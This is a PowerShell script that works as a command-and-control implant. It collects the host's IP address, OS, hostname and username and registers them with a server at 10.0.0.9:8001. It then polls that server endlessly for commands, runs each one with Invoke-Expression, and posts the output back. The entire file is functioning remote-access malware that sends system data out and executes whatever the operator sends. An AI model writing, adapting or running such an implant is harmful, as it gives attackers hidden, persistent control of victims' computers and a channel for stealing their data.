# get the IP address, OS type, and hostname of the client
$ip_address = ((ipconfig | Select-String "IPv4 Address").ToString() -split ": ")[-1]
$os_type = (Get-WmiObject -Class Win32_OperatingSystem).Caption
$hostname = (Get-WmiObject -Class Win32_ComputerSystem).Name
$username = [Environment]::UserName
$main_url = "http://10.0.0.9:8001"
$interval = 30
$intervalUnit = "Seconds"

# register the connection with the /register endpoint
$body = @{
    os_type = $os_type
    ip_address = $ip_address
    hostname = $hostname
    username = $username
} | ConvertTo-Json

Write-Host "IP Address: $ip_address"
Write-Host "OS Type: $os_type"
Write-Host "Hostname: $hostname"
Write-Host "Username: $username"

$url = "$main_url/c2/register"
$body = @{
    ip_address = $ip_address
    hostname = $hostname
    username = $username
    os = $os_type
} | ConvertTo-Json
$response = Invoke-RestMethod -Method Post -Uri $url -Body $body -ContentType "application/json"

# set the connection ID to the retrieved connection ID in the responseBody
$connection_id = $response.connection_id.ToString()

Write-Host "Registered connection with ID: $connection_id"

# while loop to check periodically for commands
while ($true) {
    $url = "$main_url/c2/get-commands/$connection_id"
    $command = Invoke-RestMethod -Method Get -Uri $url

    Write-Host "Received command: $command"

    # check if the command is empty (also check for empty list/array)
    if ([string]::IsNullOrEmpty($command)) {
        write-host "No command received yet..."
        # manufacture the start-sleep cmdlet
        $startSleepCmd = "Start-Sleep -$intervalUnit $interval"
        $startSleepCmdStr = [String]$startSleepCmd
        Invoke-Expression $startSleepCmdStr
        continue
    }

    # if the command is "exit", break out of the loop
    if ($command -eq "exit") {
        write-host "Exiting..."
        break
    }

    # execute the command and send the response back to the server
    write-host "Executing command: $command"

    # check if the command is not empty before executing it
    if ($command -ne '' -or $null -ne $command) {
        # convert the command to a string and execute it
        $commandStr = [String]$command

        # Execute the command using Invoke-Expression
        $result = Invoke-Expression $commandStr

        # Capture the output of the command as a string
        $output = $result | Out-String

        $body = @{
            output = $output
        } | ConvertTo-Json
    
        $url = "$main_url/c2/add-command-output/$connection_id"
        $body = @{
            output = $output
        } | ConvertTo-Json
        Invoke-RestMethod -Method Post -Uri $url -Body $body
    }
}
